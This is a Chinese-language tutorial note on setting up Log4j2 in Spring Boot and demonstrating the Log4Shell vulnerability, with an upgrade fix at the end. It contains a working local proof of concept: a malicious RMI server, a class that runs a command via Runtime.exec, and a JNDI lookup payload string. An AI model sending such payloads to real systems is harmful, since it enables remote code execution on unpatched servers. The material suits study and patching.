# log4j
## 使用
### 引入依赖
```xml
        <!-- log4j2 -->
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.13.3</version>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.13.3</version>
        </dependency>

```

### 依赖冲突排除依赖
```xml
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
            <exclusions>
                <exclusion>
                    <groupId>org.springframework.boot</groupId>
                    <artifactId>spring-boot-starter-logging</artifactId>
                </exclusion>
            </exclusions>
        </dependency>

```

### 测试
```java
package com.fentiaozi;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;

/**
 * @description
 * @author: fentiaozi
 * @date 2022/6/2
 */
@SpringBootTest(classes = SpringBootDemoApplication.class)
@RunWith(SpringJUnit4ClassRunner.class)
public class LogTest {
    private static final Logger LOGGER = LogManager.getLogger(LogTest.class);

    @Test
    public static void main(String[] args) {
        LOGGER.debug("Debug level log message");
        LOGGER.info("Info level log message");
        LOGGER.warn("Warn level log message");
        LOGGER.error("Error level log message");
    }

}

```

## 漏洞
> log4j2版本  2.0 ~ 2.14.1 版本均受影响
### 漏洞说明
1. 携带 `恶意参数` 请求 版本受影响的 `java应用`
2. `java应用` 向黑客服务器发送 `恶意类`
3. 通过响应的 `恶意类` 可在 java应用服务器中执行 `任意命令`

### 模拟程序
恶意服务器
```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @description
 * @author: fentiaozi
 * @date 2022/6/2
 */
public class HackServer {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, NamingException {
        Registry registry = LocateRegistry.createRegistry(1389);
        Reference reference = new Reference("com.fentiaozi.bug.HackText","com.fentiaozi.bug.HackText",null);
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("hack",wrapper);
        System.out.println("RegistryServer start...");

    }
}

```

恶意类
```java
import java.io.IOException;

/**
 * @description
 * @author: fentiaozi
 * @date 2022/6/2
 */
public class HackText {
    static {
        System.out.println("执行命令开始");
        try {
            //        Process process = Runtime.getRuntime().exec("start calc.exe")  //windows
            Process process = Runtime.getRuntime().exec("open /System/Applications/Calculator.app"); //mac
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
```

模拟测试
```java

import com.fentiaozi.SpringBootDemoApplication;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;

/**
 * @description
 * @author: fentiaozi
 * @date 2022/6/2
 */
@SpringBootTest(classes = SpringBootDemoApplication.class)
@RunWith(SpringJUnit4ClassRunner.class)
public class BugTest {
    private static final Logger LOGGER = LogManager.getLogger(BugTest.class);

    @Test
    public void testSendData() {
        // 通过jndi发送知道命令到
        String bugParams = "${jndi:rmi://127.0.0.1:1389/hack}";
        LOGGER.info("bugParams:{}", bugParams);
    }
}

```

### 解决办法
不受影响版本

Apache Log4j 2.17.0-rc1（与2.17.0稳定版相同）  
Apache Log4j 2.12.3-rc1（与2.12.3稳定版相同）  
Apache Log4j 2.3.1-rc1（与2.3.1稳定版相同）  
> 2.17.0支持Java 8及以上  
> 2.12.3支持Java 7  
> 2.3.1支持Java 6

```xml
        <!-- log4j2 -->
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.17.0</version>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.17.0</version>
        </dependency>

```